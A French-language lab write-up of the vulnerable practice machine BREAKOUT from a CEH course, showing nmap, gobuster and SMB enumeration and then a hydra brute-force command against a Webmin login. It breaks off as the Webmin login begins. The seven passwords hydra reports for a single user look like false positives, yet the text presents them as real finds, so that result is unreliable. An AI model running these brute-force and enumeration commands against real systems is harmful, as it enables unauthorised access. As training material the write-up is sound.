## Configuration du machine

![[Lab CEHV13/Write up machines vulnérables/captures/im1.png]]

Réseau : Accès par pont

### Interface web de cette machine :

http://192.168.1.62
![[Lab CEHV13/Write up machines vulnérables/captures/im2.png]]
## ÉTAPE 1 – Scan des ports (Nmap)
```
sudo nmap -sC -sV -A 192.168.1.62
```
![[Lab CEHV13/Write up machines vulnérables/captures/im3.png]]
![[Lab CEHV13/Write up machines vulnérables/captures/im4.png]]

## Analyse des résultats

**Ports ouverts intéressants :**

- **Port 80** : Apache 2.4.51 (page par défaut)
- **Port 139/445** : Samba (partages SMB)
- **Port 10000** : Webmin 1.981
- **Port 20000** : Webmin 1.830
- **Nom de la machine** : BREAKOUT
#### **1 – Énumération Web (Port 80)**
```
# Recherche de répertoires et fichiers cachés
 
gobuster dir -u http://192.168.1.62 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```
![[Lab CEHV13/Write up machines vulnérables/captures/im5.png]]

Aucune information intéressantes la de dans, donc il n'y a pas de fichier cachées

#### 2. **Énumération PME (Ports 139/445)**

Lister les partages disponibles
```
smbclient -L //192.168.1.62 -N
```
![[Lab CEHV13/Write up machines vulnérables/captures/im6.png]]

 Énumération avec enum4linux
```
 enum4linux -a 192.168.1.62
```
![[Lab CEHV13/Write up machines vulnérables/captures/im8.png]]

✅ **Pas de complexité requise** pour les mots de passe
✅ **Politique de mots de passe faible** : longueur minimale de 5 caractères


![[im9.png]]
✅ **Utilisateur Unix trouvé** : `cyber`(S-1-22-1-1000)

avec smbmap
```
smbmap -H 192.168.1.62 -u anonymous
```
![[Lab CEHV13/Write up machines vulnérables/captures/im7.png]]
❌ PME : Pas de partages accessibles anonymement


## 🎯 Stratégies d'attaque

### **Stratégie 1: Brute Force sur Webmin**

Avec l'utilisateur `cyber`découvert, essayez une force brute :
```
hydra -l cyber -P /usr/share/wordlists/rockyou.txt 192.168.1.62 -s 20000 https-form-post "/session_login.cgi:user=^USER^&pass=^PASS^:F=failed" -V
```
![[im10.png]]

# 🎉 EXCELLENT ! Nous avons trouvé des identifiants !

Hydra à découvert **7 mots de passe valides** pour l'utilisateur `cyber`! Voici les informations d’identification trouvées :
```
cyber:brenda
cyber:adidas
cyber:mustang
cyber:kitten
cyber:isabel
cyber:natalie
cyber:karen
```
## Prochaine étape : Connexion à Webmin

### **1. Connectons via l'interface web**
